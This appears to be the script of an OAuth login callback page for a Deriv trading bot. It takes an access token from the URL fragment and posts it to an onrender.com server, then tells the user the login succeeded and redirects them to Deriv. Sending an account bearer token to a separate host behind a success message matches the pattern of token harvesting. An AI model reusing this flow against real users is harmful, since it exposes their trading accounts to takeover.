<script>
  function getTokenFromUrl() {
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    return params.get('access_token');
  }

  const token = getTokenFromUrl();

  if (token) {
    fetch('https://chartbotaixtrade-1-zgsi.onrender.com/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ token })
    })
    .then(() => {
      alert('✅ Login successful! Redirecting to Deriv...');
      window.location.href = 'https://app.deriv.com/';
    })
    .catch((error) => {
      console.error('❌ Error sending token:', error);
      alert('Failed to send token.');
      window.location.href = '/';
    });
  } else {
    alert('Login cancelled or failed. Please try again.');
    window.location.href = '/';
  }
      </script>
